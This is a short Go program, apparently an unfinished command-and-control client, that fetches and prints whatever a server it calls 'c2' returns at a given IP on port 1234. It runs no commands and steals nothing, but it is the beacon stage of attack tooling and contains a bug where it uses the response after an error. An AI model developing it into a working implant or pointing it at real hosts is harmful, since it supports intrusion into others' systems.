package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
)

// port - 1234
func main() {
	ip_addr := flag.String("ip", "192.168.0.144", "ip addres of c2")
	flag.Parse()

	fmt.Printf("asdad")
	fmt.Printf("\n")

	c2_addr := "http://" + *ip_addr + ":1234/"
	fmt.Printf(c2_addr)
	fmt.Printf("\n")

	res, err := http.Get(c2_addr)
	fmt.Printf("\n")

	if err != nil {
		fmt.Printf("err")
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Printf("err")
	}
	fmt.Printf(string(body))
	fmt.Printf("\n")

}
